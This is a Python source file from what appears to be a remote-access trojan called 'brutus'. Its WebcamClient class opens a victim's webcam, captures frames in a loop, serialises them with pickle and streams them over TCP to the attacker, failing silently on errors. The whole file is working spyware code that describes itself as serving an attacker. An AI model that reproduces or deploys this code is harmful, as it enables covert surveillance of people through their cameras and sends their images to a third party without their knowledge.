import pickle
import struct
import time

from brutus.victim.client.tcp_client import TCPClient

_SIZE_FMT = struct.Struct("!I")


class WebcamClient(TCPClient):
    """Capture webcam frames and stream them to the attacker's VideoService."""

    def run(self) -> None:
        import cv2

        try:
            self.connect()
        except Exception:
            return

        cap = None
        try:
            cap = cv2.VideoCapture(0)
            while self.running:
                ret, frame = cap.read()
                if not ret:
                    time.sleep(0.05)
                    continue
                data = pickle.dumps(frame)
                self.sendall(_SIZE_FMT.pack(len(data)) + data)
        except Exception:
            pass
        finally:
            if cap is not None:
                cap.release()
            self.close()
